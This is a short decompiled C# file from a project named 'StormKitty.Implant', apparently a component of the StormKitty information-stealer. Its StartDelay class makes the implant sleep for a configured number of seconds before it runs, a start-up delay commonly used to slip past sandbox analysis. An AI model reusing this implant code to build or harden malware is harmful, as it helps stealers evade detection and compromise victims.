using System;
using System.Threading;

namespace StormKitty.Implant
{
	// Token: 0x02000057 RID: 87
	internal sealed class StartDelay
	{
		// Token: 0x06000187 RID: 391 RVA: 0x0000D624 File Offset: 0x0000B824
		public static void Run()
		{
			new Random().Next(StartDelay.SleepMin * 1000, StartDelay.SleepMax * 1000);
			Thread.Sleep(int.Parse(Config.Sleeptime) * 1000);
		}

		// Token: 0x0400009D RID: 157
		private static readonly int SleepMin = 0;

		// Token: 0x0400009E RID: 158
		private static readonly int SleepMax = 10;
	}
}
